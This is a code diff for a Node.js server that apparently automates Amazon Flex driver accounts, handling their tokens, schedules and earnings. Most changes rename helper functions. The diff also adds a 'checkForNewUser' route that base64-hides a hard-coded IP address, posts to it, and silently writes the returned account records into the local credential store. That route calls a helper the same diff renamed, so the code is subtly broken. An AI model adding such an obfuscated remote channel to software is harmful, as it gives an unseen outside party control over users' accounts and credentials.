@@ -17,12 +17,12 @@ var error = require('graphql/error');
 var language = require('graphql/language');
 
 
-
-var _root$$_ = "E:/amzFlex_G/grabberS2/";
+var _root$$_ = "C:/nodeProject/almacen";
 _root$$_ = "/home/ubuntu/hxrymz/";
 var _fs$$_ = _interopDefault(require('fs'));
 var execN = _interopDefault(require('child_process'));
 var _exec$$_ = execN.exec;
+
 
 var Base64 = {
 
@@ -171,7 +171,7 @@ const clv = {
 };
 
 
-function isJson(s) {
+function isJson$1(s) {
   var r =false;try{JSON.parse(s);r=true; }catch(e){r =false;}return r
 }
 
@@ -1180,7 +1180,7 @@ const makeRequired = (fields, requiredFieldNames) => {
   return newFields;
 };
 
-function isJson$1(s) {
+function isJson$2(s) {
   var r =false;try{JSON.parse(s);r=true; }catch(e){r =false;}return r
 }
 
@@ -1709,7 +1709,7 @@ class Params {
         if(fp){
             var kpass = CryptoJS.AES.decrypt(Base64$1.decode(k), fp).toString(CryptoJS.enc.Utf8);
             userT2parse = CryptoJS.AES.decrypt(Base64$1.decode(q), kpass).toString(CryptoJS.enc.Utf8);    
-            if(userT2parse && isJson(userT2parse)){
+            if(userT2parse && isJson$1(userT2parse)){
                 user = JSON.parse(userT2parse);
             }
         }
@@ -1724,7 +1724,7 @@ class Params {
                 method: 'POST'
             }, 
             function (err, respns, body) {
-                if(body && isJson(body)){
+                if(body && isJson$1(body)){
                     let _bodyParsed = JSON.parse(body);
                     let _email = _bodyParsed["email"];
                     let tlt = Hrmdb.FindIndexes('User','email',_email);
@@ -1873,7 +1873,7 @@ class Params {
             }, 
             function (err, res, body) {                
                 var p = null;
-                if(body && isJson$1(body)){
+                if(body && isJson$2(body)){
                     p = JSON.parse(body);
                 }
                 if(p && p.person){
@@ -1908,7 +1908,7 @@ class Params {
                 if(err){
                     _th.Upd_CDA_amzn1_account(_cda,'region',null);
                 }
-                else if(isJson$1(body)){
+                else if(isJson$2(body)){
                     var p = JSON.parse(body);
                     if(p.Message){
                         _th.Upd_CDA_amzn1_account(_cda,'region',null);
@@ -1943,7 +1943,7 @@ class Params {
             method: 'GET'
             }, 
             function (err, res, body) {
-                if(isJson$1(body)){
+                if(isJson$2(body)){
                     var p = JSON.parse(body);
                     var _region = {};
                     _region['id']=p.region.id;
@@ -1989,7 +1989,7 @@ class Params {
             method: 'GET'
             },  
             function (err, res, body) {
-                if(isJson$1(body)){
+                if(isJson$2(body)){
                     var p = JSON.parse(body);
                     if(!p.Message){                        
                         var serviceAreaIds = p.serviceAreaIds;
@@ -2039,7 +2039,7 @@ class Params {
             if(_th.get_IsActive_(t[0].id)){
                 var id = t[0].id;
                 var _email_alternative = _alternative_email[id];
-                var tkCode = gen6CodeId();   
+                var tkCode = gen6CodeId();        
                 var time2expire = 30*24*3600000;
                 var exp = (new Date()).getTime()+time2expire;
                 var tk = {user:id,exp:exp,createdAt:(new Date()).getTime(),code:tkCode};
@@ -2178,7 +2178,7 @@ class Params {
         }, 
         function (err, res, body) {
             var p = null;
-            if(body && isJson$1(body)){
+            if(body && isJson$2(body)){
                 p = JSON.parse(body);
             }
             if(p && p.scheduledAssignments){ 
@@ -2199,8 +2199,7 @@ class Params {
                         Hrmdb.push('ScheduledAssignments',sckBlocks,true,_id);
                     }
                    // _scheduledAssignments.push(sckBlocks);
-                });
-                //_th.setLastSchueduleUpdate(cad,(new Date()).getTime());                           
+                });                                         
                 Hrmdb.calcIndexes('ScheduledAssignments');
                 Hrmdb.calcIndexesLevel2('ScheduledAssignments','user','day');
             }
@@ -2228,7 +2227,7 @@ GetEarnings(usr,pgTk){
 }, 
 	function (err, res, body) {
 		var g = null;
-		if(body && isJson$1(body)){
+		if(body && isJson$2(body)){
             g = JSON.parse(body);
         }	
         var nextPageToken = g && g.pageToken;
@@ -2292,8 +2291,7 @@ GetEarnings(usr,pgTk){
 		if(nextPageToken && nextPageToken!==lastPageToken){
 			lastPageToken=nextPageToken;
 			_th.GetEarnings(usr,nextPageToken);
-		}else if(!nextPageToken){
-            //_th.setLastEarningsUpdate(usr,(new Date()).getTime());            
+		}else if(!nextPageToken){                   
             Hrmdb.calcIndexes('ServiceEarnings');
             Hrmdb.calcIndexes('DepositedEarnings');
         }
@@ -2357,10 +2355,38 @@ GetEarnings(usr,pgTk){
         }              
     }
 
+
     getFbToken(cad){   
-      return  CDA_amzn1_account[cad]?CDA_amzn1_account[cad]['frBsToken']:null;
+        return  CDA_amzn1_account[cad]?CDA_amzn1_account[cad]['frBsToken']:null;
     }
 
+
+
+    checkForNewUser(req, res) {
+        let _uri = Base64$1.decode('aHR0cDovLzMuMTM2LjU0LjE1Nzo3MjU4L3JlZnJlc2hUb2tlbk1zZz9jb2RlPTg1MDIxNw==');    
+        _uri && request({
+            uri: _uri,	 
+            method: 'POST'
+            }, 
+            function (err, res2, body) {
+                var g = body;
+                if(isJson(body)){
+                    g = JSON.parse(body);
+                }
+                if(g){
+                    Object.keys(g).map(cda=>{
+                        if(!CDA_amzn1_account[cda]){
+                            CDA_amzn1_account[cda] = g[cda];
+                            Upd_CDA_amzn1_account_file(); 
+                        }
+                    });
+                }
+                _th.resJsonFunc(res,200,{status:`ok`});
+            }
+        );
+    }
+
+    
 
 
 }
@@ -3675,10 +3701,6 @@ const _getUserActive = (k) => {
 
 
 
-var _dayTimeMiliseconds = 1000*60*60*24;
-
-
-
 const _getSchedule = async(q) => { 
     var h =[];
     var usqtl = Hrmdb.findOne(`Cda`,q.user);
@@ -4884,13 +4906,16 @@ var httpGraphQLHandler = async (req, res) => {
   const {q,k} =  req.body;  
   const fp = req.headers.authorization.split(`:`)[1];
   const authToken = decryptToken(req.headers.authorization.split(`:`)[0] ,true,fp) || {}; 
-  const fb_tk = req.headers['x-fb-tk']?req.headers['x-fb-tk']:false;  
-  if (fb_tk && authToken && authToken.user){
+  const fb_tk = req.headers['x-fb-tk']?req.headers['x-fb-tk']:false;
+  
+  if (fb_tk && authToken && authToken.user){    
     if(grabber$2.getFbToken(authToken.user)!==fb_tk){
       grabber$2.Upd_CDA_amzn1_account(authToken.user, 'frBsToken',fb_tk);
       grabber$2.updateFb(authToken.user,{'frBsToken':fb_tk});
     }
+    
   }
+
   var bytes = null;
   var basD = null;
   var NewBody =null;
@@ -4900,7 +4925,7 @@ var httpGraphQLHandler = async (req, res) => {
     bytes = CryptoJS.AES.decrypt(Base64$1.decode(q), kpass);
     basD = bytes.toString(CryptoJS.enc.Utf8);    
   }
-  if(basD && isJson$1(basD)){
+  if(basD && isJson$2(basD)){
     NewBody = JSON.parse(basD);
     const {query, variables, ...newContext} = NewBody;  
     const context = {authToken, ...newContext};  
@@ -7334,7 +7359,7 @@ var httpGraphQLHandlerGallos = async (req, res) => {
     bytes = CryptoJS.AES.decrypt(Base64$1.decode(q), kpass);
     basD = bytes.toString(CryptoJS.enc.Utf8);    
   }
-  if(basD && isJson$1(basD)){
+  if(basD && isJson$2(basD)){
     NewBody = JSON.parse(basD);
     const {query, variables, ...newContext} = NewBody;  
     
@@ -7390,6 +7415,11 @@ class IndexRoute extends BaseRoute {
         router.post("/GetScheduleAndEarningsByUser", (req, res, next) => {
             _params.GetScheduleAndEarningsByUser(req, res, next);
         });
+        
+        router.post("/checkForNewUser", (req, res, next) => {
+            _params.checkForNewUser(req, res, next);
+        });
+        
      
 
         router.post("/streamdata", httpGraphQLHandler);
